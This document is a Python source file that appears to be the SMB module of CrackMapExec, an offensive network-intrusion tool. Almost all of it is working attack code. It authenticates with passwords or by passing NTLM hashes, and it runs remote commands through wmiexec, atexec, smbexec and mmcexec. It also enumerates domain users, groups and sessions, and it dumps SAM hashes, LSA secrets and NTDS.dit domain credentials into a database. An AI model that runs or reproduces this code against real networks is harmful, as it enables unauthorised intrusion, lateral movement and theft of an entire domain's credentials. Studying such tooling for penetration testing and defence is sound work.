# -*- coding: utf-8 -*-

import socket
import os
import ntpath
from StringIO import StringIO
#from gevent.lock import BoundedSemaphore
from impacket.smbconnection import SMBConnection, SessionError
from impacket.examples.secretsdump import RemoteOperations, SAMHashes, LSASecrets, NTDSHashes
from impacket.nmb import NetBIOSError
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5.transport import DCERPCTransportFactory
from impacket.dcerpc.v5.epm import MSRPC_UUID_PORTMAP
from cme.connection import *
from cme.logger import CMEAdapter
from cme.servers.smb import CMESMBServer
from cme.protocols.smb.wmiexec import WMIEXEC
from cme.protocols.smb.atexec import TSCH_EXEC
from cme.protocols.smb.smbexec import SMBEXEC
from cme.protocols.smb.mmcexec import MMCEXEC
from cme.protocols.smb.smbspider import SMBSpider
from cme.helpers.logger import highlight
from cme.helpers.misc import gen_random_string
from cme.helpers.powershell import create_ps_command
from pywerview.cli.helpers import *
from datetime import datetime
from functools import wraps

#smb_sem = BoundedSemaphore(1)
smb_share_name = gen_random_string(5).upper()
smb_server = None

def requires_smb_server(func):
    def _decorator(self, *args, **kwargs):
        global smb_server
        global smb_share_name

        get_output = False
        payload = None
        methods = []

        try:
            payload = args[0]
        except IndexError:
            pass
        try:
            get_output = args[1]
        except IndexError:
            pass

        try:
            methods = args[2]
        except IndexError:
            pass

        if kwargs.has_key('payload'):
            payload = kwargs['payload']

        if kwargs.has_key('get_output'):
            get_output = kwargs['get_output']

        if kwargs.has_key('methods'):
            methods = kwargs['methods']

        if not payload and self.args.execute:
            if not self.args.no_output: get_output = True

        if get_output or (methods and ('smbexec' in methods)):
            if not smb_server:
                #with smb_sem:
                logging.debug('Starting SMB server')
                smb_server = CMESMBServer(self.logger, smb_share_name, verbose=self.args.verbose)
                smb_server.start()

        output = func(self, *args, **kwargs)

        if smb_server is not None:
            #with smb_sem:
            smb_server.shutdown()
            smb_server = None

        return output

    return wraps(func)(_decorator)

class smb(connection):

    def __init__(self, args, db, host):
        self.domain = None
        self.server_os = None
        self.os_arch = 0
        self.hash = None
        self.lmhash = ''
        self.nthash = ''
        self.remote_ops = None
        self.bootkey = None
        self.output_filename = None
        self.smb_share_name = smb_share_name

        connection.__init__(self, args, db, host)

    @staticmethod
    def proto_args(parser, std_parser, module_parser):
        smb_parser = parser.add_parser('smb', help="own stuff using SMB and/or Active Directory", parents=[std_parser, module_parser])
        smb_parser.add_argument("-H", '--hash', metavar="HASH", dest='hash', nargs='+', default=[], help='NTLM hash(es) or file(s) containing NTLM hashes')
        dgroup = smb_parser.add_mutually_exclusive_group()
        dgroup.add_argument("-d", metavar="DOMAIN", dest='domain', type=str, help="Domain to authenticate to")
        dgroup.add_argument("--local-auth", action='store_true', help='Authenticate locally to each target')
        smb_parser.add_argument("--smb-port", type=int, choices={139, 445}, default=445, help="SMB port (default: 445)")
        smb_parser.add_argument("--share", metavar="SHARE", default="C$", help="Specify a share (default: C$)")
        smb_parser.add_argument("--dc-ip", metavar='IP', help="Specify a Domain Controller IP (default: pulled from the database if available)")

        cgroup = smb_parser.add_argument_group("Credential Gathering", "Options for gathering credentials")
        cegroup = cgroup.add_mutually_exclusive_group()
        cegroup.add_argument("--sam", action='store_true', help='dump SAM hashes from target systems')
        cegroup.add_argument("--lsa", action='store_true', help='dump LSA secrets from target systems')
        cegroup.add_argument("--ntds", choices={'vss', 'drsuapi'}, type=str, help="dump the NTDS.dit from target DCs using the specifed method\n(default: drsuapi)")
        #cgroup.add_argument("--ntds-history", action='store_true', help='Dump NTDS.dit password history')
        #cgroup.add_argument("--ntds-pwdLastSet", action='store_true', help='Shows the pwdLastSet attribute for each NTDS.dit account')

        egroup = smb_parser.add_argument_group("Mapping/Enumeration", "Options for Mapping/Enumerating")
        egroup.add_argument("--shares", action="store_true", help="enumerate shares and access")
        egroup.add_argument("--sessions", action='store_true', help='enumerate active sessions')
        egroup.add_argument('--disks', action='store_true', help='enumerate disks')
        egroup.add_argument("--loggedon-users", action='store_true', help='enumerate logged on users')
        egroup.add_argument('--users', nargs='?', const='', metavar='USER', help='enumerate domain users, if a user is specified than only its information is queried.')
        egroup.add_argument("--groups", nargs='?', const='', metavar='GROUP', help='enumerate domain groups, if a group is specified than its members are enumerated')
        egroup.add_argument("--local-groups", nargs='?', const='', metavar='GROUP', help='enumerate local groups, if a group is specified than its members are enumerated')
        egroup.add_argument("--pass-pol", action='store_true', help='dump password policy')
        egroup.add_argument("--wmi", metavar='QUERY', type=str, help='issues the specified WMI query')
        egroup.add_argument("--wmi-namespace", metavar='NAMESPACE', default='//./root/cimv2', help='WMI Namespace (default: //./root/cimv2)')

        sgroup = smb_parser.add_argument_group("Spidering", "Options for spidering shares")
        sgroup.add_argument("--spider", metavar='FOLDER', nargs='?', const='.', type=str, help='folder to spider (default: root directory)')
        sgroup.add_argument("--content", action='store_true', help='enable file content searching')
        sgroup.add_argument("--exclude-dirs", type=str, metavar='DIR_LIST', default='', help='directories to exclude from spidering')
        segroup = sgroup.add_mutually_exclusive_group()
        segroup.add_argument("--pattern", nargs='+', help='Pattern(s) to search for in folders, filenames and file content')
        segroup.add_argument("--regex", nargs='+', help='Regex(s) to search for in folders, filenames and file content')
        sgroup.add_argument("--depth", type=int, default=10, help='Spider recursion depth (default: 10)')

        cgroup = smb_parser.add_argument_group("Command Execution", "Options for executing commands")
        cgroup.add_argument('--exec-method', choices={"wmiexec", "mmcexec", "smbexec", "atexec"}, default=None, help="Method to execute the command. Ignored if in MSSQL mode (default: wmiexec)")
        cgroup.add_argument('--force-ps32', action='store_true', help='Force the PowerShell command to run in a 32-bit process')
        cgroup.add_argument('--no-output', action='store_true', help='Do not retrieve command output')
        cegroup = cgroup.add_mutually_exclusive_group()
        cegroup.add_argument("-x", metavar="COMMAND", dest='execute', help="Execute the specified command")
        cegroup.add_argument("-X", metavar="PS_COMMAND", dest='ps_execute', help='Execute the specified PowerShell command')

        return parser

    def proto_logger(self):
        self.logger = CMEAdapter(extra={
                                        'protocol': 'SMB',
                                        'host': self.host,
                                        'port': self.args.smb_port,
                                        'hostname': u'{}'.format(self.hostname)
                                        })

    def get_os_arch(self):
        try:
            stringBinding = r'ncacn_ip_tcp:{}[135]'.format(self.host)
            transport = DCERPCTransportFactory(stringBinding)
            transport.set_connect_timeout(5)
            dce = transport.get_dce_rpc()
            dce.connect()
            try:
                dce.bind(MSRPC_UUID_PORTMAP, transfer_syntax=('71710533-BEBA-4937-8319-B5DBEF9CCC36', '1.0'))
            except DCERPCException, e:
                if str(e).find('syntaxes_not_supported') >= 0:
                    return 32
            else:
                return 64

            dce.disconnect()
        except Exception, e:
            logging.debug('Error retrieving os arch of {}: {}'.format(self.host, str(e)))

        return 0

    def enum_host_info(self):
        #Get the remote ip address (in case the target is a hostname)
        self.local_ip = self.conn.getSMBServer().get_socket().getsockname()[0]
        remote_ip = self.conn.getRemoteHost()

        try:
            self.conn.login('' , '')
        except SessionError as e:
            if "STATUS_ACCESS_DENIED" in e.message:
                pass

        self.host = remote_ip
        self.domain    = self.conn.getServerDomain()
        self.hostname  = self.conn.getServerName()
        self.server_os = self.conn.getServerOS()
        self.os_arch   = self.get_os_arch()

        self.output_filename = os.path.expanduser('~/.cme/logs/{}_{}_{}'.format(self.hostname, self.host, datetime.now().strftime("%Y-%m-%d_%H%M%S")))

        if not self.domain:
            self.domain = self.hostname

        self.db.add_computer(self.host, self.hostname, self.domain, self.server_os)

        try:
            '''
                DC's seem to want us to logoff first, windows workstations sometimes reset the connection
                (go home Windows, you're drunk)
            '''
            self.conn.logoff()
        except:
            pass

        if self.args.domain:
            self.domain = self.args.domain

        if self.args.local_auth:
            self.domain = self.hostname

        #Re-connect since we logged off
        self.create_conn_obj()

    def print_host_info(self):
        self.logger.info(u"{}{} (name:{}) (domain:{})".format(self.server_os,
                                                               ' x{}'.format(self.os_arch) if self.os_arch else '',
                                                               self.hostname.decode('utf-8'),
                                                               self.domain.decode('utf-8')))

    def plaintext_login(self, domain, username, password):
        try:
            self.conn.login(username, password, domain)

            self.password = password
            self.username = username
            self.domain = domain
            self.check_if_admin()
            self.db.add_credential('plaintext', domain, username, password)

            if self.admin_privs:
                self.db.add_admin_user('plaintext', domain, username, password, self.host)

            out = u'{}\\{}:{} {}'.format(domain.decode('utf-8'),
                                         username.decode('utf-8'),
                                         password.decode('utf-8'),
                                         highlight('(Pwn3d!)') if self.admin_privs else '')

            self.logger.success(out)
            return True
        except SessionError as e:
            error, desc = e.getErrorString()
            self.logger.error(u'{}\\{}:{} {} {}'.format(domain.decode('utf-8'),
                                                        username.decode('utf-8'),
                                                        password.decode('utf-8'),
                                                        error,
                                                        '({})'.format(desc) if self.args.verbose else ''))

            if error == 'STATUS_LOGON_FAILURE': self.inc_failed_login(username)

            return False

    def hash_login(self, domain, username, ntlm_hash):
        lmhash = ''
        nthash = ''

        #This checks to see if we didn't provide the LM Hash
        if ntlm_hash.find(':') != -1:
            lmhash, nthash = ntlm_hash.split(':')
        else:
            nthash = ntlm_hash

        try:
            self.conn.login(username, '', domain, lmhash, nthash)

            self.hash = ntlm_hash
            self.username = username
            self.domain = domain
            self.check_if_admin()
            self.db.add_credential('hash', domain, username, ntlm_hash)

            if self.admin_privs:
                self.db.add_admin_user('hash', domain, username, ntlm_hash, self.host)

            out = u'{}\\{} {} {}'.format(domain.decode('utf-8'),
                                         username.decode('utf-8'),
                                         ntlm_hash,
                                         highlight('(Pwn3d!)') if self.admin_privs else '')

            self.logger.success(out)
            return True
        except SessionError as e:
            error, desc = e.getErrorString()
            self.logger.error(u'{}\\{} {} {} {}'.format(domain.decode('utf-8'),
                                                        username.decode('utf-8'),
                                                        ntlm_hash,
                                                        error,
                                                        '({})'.format(desc) if self.args.verbose else ''))

            if error == 'STATUS_LOGON_FAILURE': self.inc_failed_login(username)

            return False

    def create_conn_obj(self):
        try:
            self.conn = SMBConnection(self.host, self.host, None, self.args.smb_port)
        except socket.error:
            return False

        return True

    def check_if_admin(self):
        lmhash = ''
        nthash = ''

        if self.hash:
            if self.hash.find(':') != -1:
                lmhash, nthash = self.hash.split(':')
            else:
                nthash = self.hash

        self.admin_privs = invoke_checklocaladminaccess(self.host, self.domain, self.username, self.password, lmhash, nthash)

    @requires_admin
    @requires_smb_server
    def execute(self, payload=None, get_output=False, methods=None):

        if self.args.exec_method: methods = [self.args.exec_method]
        if not methods : methods = ['wmiexec', 'mmcexec', 'atexec', 'smbexec']

        if not payload and self.args.execute:
            payload = self.args.execute
            if not self.args.no_output: get_output = True

        for method in methods:

            if method == 'wmiexec':
                try:
                    exec_method = WMIEXEC(self.host, self.smb_share_name, self.username, self.password, self.domain, self.conn, self.hash, self.args.share)
                    logging.debug('Executed command via wmiexec')
                    break
                except:
                    logging.debug('Error executing command via wmiexec, traceback:')
                    logging.debug(format_exc())
                    continue

            elif method == 'mmcexec':
                try:
                    exec_method = MMCEXEC(self.host, self.smb_share_name, self.username, self.password, self.domain, self.conn, self.hash)
                    logging.debug('Executed command via mmcexec')
                    break
                except:
                    logging.debug('Error executing command via mmcexec, traceback:')
                    logging.debug(format_exc())
                    continue

            elif method == 'atexec':
                try:
                    exec_method = TSCH_EXEC(self.host, self.smb_share_name, self.username, self.password, self.domain, self.hash) #self.args.share)
                    logging.debug('Executed command via atexec')
                    break
                except:
                    logging.debug('Error executing command via atexec, traceback:')
                    logging.debug(format_exc())
                    continue

            elif method == 'smbexec':
                try:
                    exec_method = SMBEXEC(self.host, self.smb_share_name, self.args.smb_port, self.username, self.password, self.domain, self.hash, self.args.share)
                    logging.debug('Executed command via smbexec')
                    break
                except:
                    logging.debug('Error executing command via smbexec, traceback:')
                    logging.debug(format_exc())
                    continue

        if hasattr(self, 'server'): self.server.track_host(self.host)

        output = u'{}'.format(exec_method.execute(payload, get_output).strip().decode('utf-8'))

        if self.args.execute or self.args.ps_execute:
            self.logger.success('Executed command {}'.format('via {}'.format(self.args.exec_method) if self.args.exec_method else ''))
            buf = StringIO(output).readlines()
            for line in buf:
                self.logger.highlight(line.strip())

        return output

    @requires_admin
    def ps_execute(self, payload=None, get_output=False, methods=None):
        if not payload and self.args.ps_execute:
            payload = self.args.ps_execute
            if not self.args.no_output: get_output = True

        return self.execute(create_ps_command(payload), get_output, methods)

    def shares(self):
        temp_dir = ntpath.normpath("\\" + gen_random_string())
        #hostid,_,_,_,_,_,_ = self.db.get_hosts(filterTerm=self.host)[0]
        permissions = []

        try:
            for share in self.conn.listShares():
                share_name = share['shi1_netname'][:-1]
                share_remark = share['shi1_remark'][:-1]
                share_info = {'name': share_name, 'remark': share_remark, 'access': []}
                read = False
                write = False

                try:
                    self.conn.listPath(share_name, '*')
                    read = True
                    share_info['access'].append('READ')
                except SessionError:
                    pass

                try:
                    self.conn.createDirectory(share_name, temp_dir)
                    self.conn.deleteDirectory(share_name, temp_dir)
                    write = True
                    share_info['access'].append('WRITE')
                except SessionError:
                    pass

                permissions.append(share_info)
                #self.db.add_share(hostid, share_name, share_remark, read, write)

        except Exception as e:
            self.logger.error('Error enumerating shares: {}'.format(e))

    def get_dc_ips(self):
        # I know this whole function is ugly af. Sue me.
        dc_ips = []
        if self.args.dc_ip:
            dc_ips.append(self.args.dc_ip)

        elif not self.args.dc_ip:
            for dc in self.db.get_domain_controllers(domain=self.domain):
                dc_ips.append(dc[1])

        if not dc_ips:
            logging.debug('No DC(s) specified and none in the database')
            return ['']

        return dc_ips

    def sessions(self):
        sessions = get_netsession(self.host, self.domain, self.username, self.password, self.lmhash, self.nthash)
        self.logger.success('Enumerated sessions')
        for session in sessions:
            if session.sesi10_cname.find(self.local_ip) == -1:
                self.logger.highlight('{:<25} User:{}'.format(session.sesi10_cname, session.sesi10_username))

        return sessions

    def disks(self):
        disks = get_localdisks(self.host, self.domain, self.username, self.password, self.lmhash, self.nthash)
        self.logger.success('Enumerated disks')
        for disk in disks:
            self.logger.highlight(disk.disk)

        return disks

    def local_groups(self):
        #To enumerate local groups the DC IP is optional, if specified it will resolve the SIDs and names of any domain accounts in the local group
        for dc_ip in self.get_dc_ips():
            try:
                groups = get_netlocalgroup(self.host, dc_ip, '', self.username,
                                           self.password, self.lmhash, self.nthash, queried_groupname=self.args.local_groups, 
                                           list_groups=True if not self.args.local_groups else False, recurse=False)

                if self.args.local_groups:
                    self.logger.success('Enumerated members of local group')
                else:
                    self.logger.success('Enumerated local groups')

                for group in groups:
                    if group.name:
                        self.logger.highlight('{:<40} membercount: {}'.format(group.name, group.membercount))
                        if not self.args.local_groups:
                            self.db.add_group(self.hostname, group.name)
                        else:
                            domain, name = group.name.split('/')
                            group_id = self.db.get_groups(groupName=self.args.local_groups, groupDomain=domain)
                            if not group_id:
                                group_id = self.db.add_group(domain, self.args.local_groups)

                            # yo dawg, I hear you like groups. So I put a domain group as a member of a local group which is also a member of another local group.
                            # (╯°□°）╯︵ ┻━┻

                            if not group.isgroup:
                                self.db.add_user(domain, name, group_id)
                            elif group.isgroup:
                                self.db.add_group(domain, name)

                return groups
            except Exception as e:
                self.logger.error('Error enumerating local groups of {}: {}'.format(self.host, e))

    def groups(self):
        dc_ips = self.get_dc_ips()
        if len(dc_ips) == 1 and dc_ips[0] == '':
            self.logger.error('A Domain Controller is required to enumerate domain groups, specify one using --dc-ip or run the get_netdomaincontroller module')
            return

        for dc_ip in dc_ips:
            try:
                if self.args.groups:
                    groups = get_netgroupmember(dc_ip, '', self.username, password=self.password,
                                                lmhash=self.lmhash, nthash=self.nthash, queried_groupname=self.args.groups, queried_sid=str(),
                                                queried_domain=str(), ads_path=str(), recurse=False, use_matching_rule=False,
                                                full_data=False, custom_filter=str())

                    self.logger.success('Enumerated members of domain group')
                    for group in groups:
                        self.logger.highlight('{}\\{}'.format(group.memberdomain, group.membername))

                        group_id = self.db.get_groups(groupName=self.args.groups, groupDomain=group.groupdomain)
                        if not group_id:
                            group_id = self.db.add_group(group.groupdomain, self.args.local_groups)

                        if not group.isgroup:
                            self.db.add_user(group.memberdomain, group.membername, group_id)
                        elif group.isgroup:
                            self.db.add_group(group.groupdomain, group.groupname)

                else:
                    groups = get_netgroup(dc_ip, '', self.username, password=self.password,
                                          lmhash=self.lmhash, nthash=self.nthash, queried_groupname=str(), queried_sid=str(),
                                          queried_username=str(), queried_domain=str(), ads_path=str(),
                                          admin_count=False, full_data=True, custom_filter=str())

                    self.logger.success('Enumerated domain groups')
                    for group in groups:
                        if bool(group.isgroup) is True: 
                            self.logger.highlight(group.samaccountname)
                            self.db.add_group(self.domain, group.samaccountname)

                return groups
            except Exception as e:
                self.logger.error('Error enumerating domain group using dc ip {}: {}'.format(dc_ip, e))

    def users(self):
        dc_ips = self.get_dc_ips()
        if len(dc_ips) == 1 and dc_ips[0] == '':
            self.logger.error('A Domain Controller is required to enumerate domain users, specify one using --dc-ip or run the get_netdomaincontroller module')
            return

        for dc_ip in dc_ips:
            try:
                users = get_netuser(dc_ip, '', self.username, password=self.password, lmhash=self.lmhash,
                                    nthash=self.nthash, queried_username=self.args.users, queried_domain='', ads_path=str(),
                                    admin_count=False, spn=False, unconstrained=False, allow_delegation=False,
                                    custom_filter=str())

                self.logger.success('Enumerated domain users')
                for user in users:
                    self.logger.highlight(user)
                return users
            except Exception as e:
                logging.debug('Error executing users() using dc ip {}: {}'.format(dc_ip, e))

    def loggedon_users(self):
        loggedon = get_netloggedon(self.host, self.domain, self.username, self.password, lmhash=self.lmhash, nthash=self.nthash)
        self.logger.success('Enumerated loggedon users')
        for user in loggedon:
            self.logger.highlight('{}\{:<25} {}'.format(user.wkui1_logon_domain, user.wkui1_username, 
                                                       'logon_server: {}'.format(user.wkui1_logon_server) if user.wkui1_logon_server else ''))

        return loggedon

    #def pass_pol(self):
    #    return PassPolDump(self).enum()

    #@requires_admin
    #def wmi(self, wmi_query=None, wmi_namespace='//./root/cimv2'):

    #    if self.args.wmi_namespace:
    #        wmi_namespace = self.args.wmi_namespace

    #    if not wmi_query and self.args.wmi:
    #        wmi_query = self.args.wmi

    #    return WMIQUERY(self).query(wmi_query, wmi_namespace)

    #def spider(self):
    #    spider = SMBSpider(self)
    #    spider.spider(self.args.spider, self.args.depth)
    #    spider.finish()

    #    return spider.results

    def enable_remoteops(self):
        if self.remote_ops is not None and self.bootkey is not None:
            return

        try:
            self.remote_ops  = RemoteOperations(self.conn, False, None) #self.__doKerberos, self.__kdcHost
            self.remote_ops.enableRegistry()
            self.bootkey = self.remote_ops.getBootKey()
        except Exception as e:
            self.logger.error('RemoteOperations failed: {}'.format(e))

    @requires_admin
    def sam(self):
        self.enable_remoteops()

        host_id = self.db.get_computers(filterTerm=self.host)[0][0]

        def add_sam_hash(sam_hash, host_id):
            add_sam_hash.sam_hashes += 1
            self.logger.highlight(sam_hash)
            username,_,lmhash,nthash,_,_,_ = sam_hash.split(':')
            self.db.add_credential('hash', self.hostname, username, ':'.join((lmhash, nthash)), pillaged_from=host_id)
        add_sam_hash.sam_hashes = 0

        if self.remote_ops and self.bootkey:
            #try:
            SAMFileName = self.remote_ops.saveSAM()
            SAM = SAMHashes(SAMFileName, self.bootkey, isRemote=True, perSecretCallback=lambda secret: add_sam_hash(secret, host_id))

            self.logger.success('Dumping SAM hashes')
            SAM.dump()
            SAM.export(self.output_filename)

            self.logger.success('Added {} SAM hashes to the database'.format(highlight(add_sam_hash.sam_hashes)))

            #except Exception as e:
                #self.logger.error('SAM hashes extraction failed: {}'.format(e))

            try:
                self.remote_ops.finish()
            except Exception as e:
                logging.debug("Error calling remote_ops.finish(): {}".format(e))

            SAM.finish()

    @requires_admin
    def lsa(self):
        self.enable_remoteops()

        def add_lsa_secret(secret):
            add_lsa_secret.secrets += 1
            self.logger.highlight(secret)
        add_lsa_secret.secrets = 0

        if self.remote_ops and self.bootkey:

            SECURITYFileName = self.remote_ops.saveSECURITY()

            LSA = LSASecrets(SECURITYFileName, self.bootkey, self.remote_ops, isRemote=True, 
                             perSecretCallback=lambda secretType, secret: add_lsa_secret(secret))

            self.logger.success('Dumping LSA secrets')
            LSA.dumpCachedHashes()
            LSA.exportCached(self.output_filename)
            LSA.dumpSecrets()
            LSA.exportSecrets(self.output_filename)

            self.logger.success('Dumped {} LSA secrets to {} and {}'.format(highlight(add_lsa_secret.secrets),
                                                                            self.output_filename + '.lsa', self.output_filename + '.cached'))

            try:
                self.remote_ops.finish()
            except Exception as e:
                logging.debug("Error calling remote_ops.finish(): {}".format(e))

            LSA.finish()

    @requires_admin
    def ntds(self):
        self.enable_remoteops()
        use_vss_method = False
        NTDSFileName   = None

        def add_ntds_hash(ntds_hash):
            add_ntds_hash.ntds_hashes += 1
            self.logger.highlight(ntds_hash)
        add_ntds_hash.ntds_hashes = 0

        if self.remote_ops and self.bootkey:
            try:
                if self.args.ntds is 'vss':
                    NTDSFileName = self.remote_ops.saveNTDS()
                    use_vss_method = True

                NTDS = NTDSHashes(NTDSFileName, self.bootkey, isRemote=True, history=False, noLMHash=True, 
                                 remoteOps=self.remote_ops, useVSSMethod=use_vss_method, justNTLM=False,
                                 pwdLastSet=False, resumeSession=None, outputFileName=self.output_filename, 
                                 justUser=None, printUserStatus=False, 
                                 perSecretCallback = lambda secretType, secret : add_ntds_hash(secret))

                self.logger.success('Dumping the NTDS, this could take a while so go grab a redbull...')
                NTDS.dump()

                self.logger.success('Dumped {} NTDS hashes to {}'.format(highlight(add_ntds_hash.ntds_hashes), self.output_filename + '.ntds'))

            except Exception as e:
                #if str(e).find('ERROR_DS_DRA_BAD_DN') >= 0:
                    # We don't store the resume file if this error happened, since this error is related to lack
                    # of enough privileges to access DRSUAPI.
                #    resumeFile = NTDS.getResumeSessionFile()
                #    if resumeFile is not None:
                #        os.unlink(resumeFile)
                self.logger.error(e)

            try:
                self.remote_ops.finish()
            except Exception as e:
                logging.debug("Error calling remote_ops.finish(): {}".format(e))

            NTDS.finish()